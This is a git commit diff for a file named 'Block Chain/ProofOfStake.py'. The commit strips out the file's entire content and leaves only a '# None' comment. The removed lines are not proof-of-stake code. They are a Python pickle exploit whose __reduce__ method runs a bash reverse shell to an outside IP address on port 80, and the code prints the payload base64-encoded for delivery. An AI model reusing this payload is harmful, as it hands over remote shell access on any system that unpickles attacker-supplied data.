450d12d011164f3196b6731f704d27633bf784bf
pocas <49112423+wjddnjs33@users.noreply.github.com>
2021-05-13 14:24:38 +0900

    Update ProofOfStake.py

--- Block Chain/ProofOfStake.py
+++ Block Chain/ProofOfStake.py
@@ -1,9 +1,1 @@
-import os
-import pickle
-import base64
-
-class rce(object):
-  def __reduce__(self):
-    return (os.system, ('bash -i >& /dev/tcp/141.164.52.207/80 0>&1',))
-
-print(base64.b64encode(pickle.dumps(rce())))
+# None
